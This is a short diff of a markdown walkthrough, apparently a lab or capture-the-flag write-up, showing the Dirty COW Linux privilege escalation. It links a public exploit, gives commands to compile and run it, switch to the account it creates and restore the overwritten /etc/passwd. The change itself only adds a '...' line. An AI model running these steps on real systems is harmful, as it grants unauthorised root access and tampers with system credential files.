@@ -20,6 +20,7 @@ We find a nice c program to exploit it `https://github.com/FireFart/dirtycow/blo
 ```bash
 $ gcc -pthread dirty.c -o dirty -lcrypt
 $ ./dirty
+...
 $ su firefart
 $ mv /tmp/passwd.bak /etc/passwd
 $ id
